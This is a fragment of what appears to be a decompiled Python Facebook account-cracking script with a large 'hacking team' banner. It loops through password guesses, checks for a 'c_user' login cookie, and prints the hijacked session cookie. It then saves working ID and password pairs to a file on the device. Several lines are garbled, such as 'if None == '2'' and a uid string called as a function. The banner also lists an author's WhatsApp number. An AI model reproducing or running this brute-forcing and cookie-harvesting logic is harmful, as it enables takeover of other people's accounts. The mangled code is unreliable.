...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/Jahidul1223?mibextid=ZbWKwL')
        return None
    if None == '3':
...
╚══════╝╚═╝  ╚═╝ ╚════╝  ╚════╝ ╚═╝  ╚═╝╚═════╝  
\033[36;1m┌───────────────────────────────────────┐
\033[36;1m│ [♣][♠]𝐀𝐔𝐓𝐇𝐎𝐑____SAJJAD 𝐇𝐎𝐒𝐒𝐀𝐈𝐍❥        │
\033[36;1m│ [♣][♠]𝐆𝐈𝐓𝐇𝐔𝐁_____SAJJAD-KING BOY ❥    │
\033[36;1m│ [♣][♠]𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏___+8801965-798980❥      │
\033[36;1m│ [♣][♠]𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊____SAJJAD_HOSSAIN       │
\033[36;1m│ [♣][♠]𝐕𝐄𝐑𝐒𝐈𝐎𝐍____𝐎.𝟐❥                 │
\033[36;1m│ [♣][♠]𝐅𝐑𝐎𝐌___𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇❥              │
\033[36;1m│ [♣][♠]𝐖𝐎𝐑𝐊___𝐇𝐀𝐂𝐊𝐈𝐍𝐆_𝐏𝐎𝐆𝐑𝐀𝐌𝐈𝐆❥        │
\033[36;1m│ [♣][♠]𝐁𝐎𝐗___𝐂𝐘𝐁𝐄𝐑_KING BOY _𝐓𝐄𝐀𝐌❥    │
\033[36;1m│ [♣][♠]𝐏𝐎𝐖𝐄𝐑__𝐁𝐘__\033[1;36m𝐌𝐀𝐗 SAJJAD❥\033[1;36m           │
\033[36;1m└───────────────────────────────────────┘\n""")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\033[1;32mSAJJAD-CYBER-OK ]' +cid+ ' | ' +ps+'\033[0;35m')
                print(f"{H}\033[0;35m[🍪]COOKIE :\033[1;32m{coki}")
                cek_apk(session,coki)
                uid('/sdcard/SAJJAD-CYBER-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s[SAJJAD-CYBER] \033[1;32m[%s/%s] \033[1;32m[OK-%s] \r'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
